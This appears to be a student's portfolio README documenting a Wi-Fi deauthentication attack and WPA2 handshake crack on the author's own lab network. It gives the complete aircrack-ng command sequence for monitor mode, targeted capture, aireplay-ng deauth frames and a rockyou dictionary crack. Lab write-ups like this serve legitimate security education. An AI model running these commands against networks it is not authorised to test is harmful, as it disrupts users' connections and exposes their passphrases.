# Portfolio-DeauthAttack 🔓📡

This repository documents my **controlled Wi-Fi deauthentication (deauth) attack** and **WPA2 handshake capture** performed inside a **Kali Linux VM running on VMware Workstation Pro**. The objective: force a client on **my own test network** to disconnect, capture the WPA2 handshake, and crack a weak passphrase with the `aircrack-ng` suite.

> ⚠️ **Ethical Notice:** Performed only on a network I own, strictly for education and portfolio purposes. Do **not** test on networks without explicit authorization.

---

## ⚙️ Lab Environment

- **Platform:** VMware Workstation Pro  
- **Guest OS:** Kali Linux (kali-rolling)  
- **VM Resources:** 8 GB RAM • 4 vCPUs • 80 GB storage  
- **Wi-Fi Adapters:** 2× **ALFA AWUS036ACM** (USB passthrough)  
  - `wlan0` → handshake capture  
  - `wlan1mon` → packet injection / deauth  
- **Tools:** `airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng`  
- **Wordlist:** `rockyou.txt`  

---

## 📸 Step-By-Step Process (Commands + Evidence)

### 1) Detect Wireless Adapters
    iwconfig
Identify available interfaces before starting.
![Detect Adapters](https://github.com/SecuredByKC/Portfolio-DeauthAttack/raw/main/01_detect_wireless_adapters.png)

---

### 2) Enable Monitor Mode (Injection Adapter)
    sudo airmon-ng start wlan1
Enable monitor mode on the adapter dedicated to injection; this creates `wlan1mon`.
![Enable Monitor Mode](https://github.com/SecuredByKC/Portfolio-DeauthAttack/raw/main/03_enable_monitor_mode.png)

---

### 3) Scan Nearby Wi-Fi Networks (Discovery)
    sudo airodump-ng wlan1mon
Discover SSIDs/BSSIDs and confirm the target (**KC’s Mobile WPA2 Network**).
![Scan Wi-Fi Networks](https://github.com/SecuredByKC/Portfolio-DeauthAttack/raw/main/04_scan_wifi_networks.png)

---

### 4) Focus on Target & Start Capture (Listener Adapter)
    sudo airodump-ng --bssid <TARGET_BSSID> -c <CHANNEL> -w capture wlan0
Lock onto the target AP on its channel and write packets to `capture.cap` using the listener interface.
![Target Network Capture](https://github.com/SecuredByKC/Portfolio-DeauthAttack/raw/main/05_target_network_airodump.png)

---

### 5) Deauthenticate a Client (Trigger Handshake)
    sudo aireplay-ng --deauth 10 -a <TARGET_BSSID> -c <CLIENT_MAC> wlan1mon
Send deauth frames from the injection adapter to force a reconnect, generating the WPA2 4-way handshake.
![Handshake Captured](https://github.com/SecuredByKC/Portfolio-DeauthAttack/raw/main/07_handshake_file_confirmed.png)

---

### 6) Crack the Captured Handshake
    aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <TARGET_BSSID> capture-01.cap
Run a dictionary attack with `rockyou.txt` against the handshake capture.
![Password Cracked](https://github.com/SecuredByKC/Portfolio-DeauthAttack/raw/main/08_password_cracked_aircrackng.png)

---

## 🖥️ VMware & Hardware Notes

- **USB Passthrough:** Both **ALFA AWUS036ACM** adapters are attached directly to the guest VM for full monitor/injection support.  
- **Networking:** VM set to **NAT** for package updates; wireless adapters are **not** bridged as NICs—each is passed through as a USB device to Kali.  
- **Driver Support:** Ensure chipset/driver support in Kali so `monitor` mode and injection function correctly.

---

## ✅ Key Takeaways

- Practical use of **monitor mode** and **packet injection** to obtain a WPA2 handshake  
- Understanding of **BSSID vs. client MAC** roles during deauth  
- Successful **dictionary attack** demonstrating risk of weak passphrases  
- Solid **VMware + USB Wi-Fi** lab configuration with **ALFA AWUS036ACM** adapters

---

## 📂 Repo Contents

- Step screenshots (evidence)  
- This `README.md` documenting methodology, tooling, and lab setup

---

## ⚖️ Legal & Ethical Reminder

This methodology is provided for **defensive education**. Always obtain **explicit written permission** before testing any network you don’t own. Unauthorized access is illegal and unethical.

---

## 👤 Author

**Karim Cherradi** — Cybersecurity Student & Ethical Hacker in Training  
GitHub: [@SecuredByKC](https://github.com/SecuredByKC)
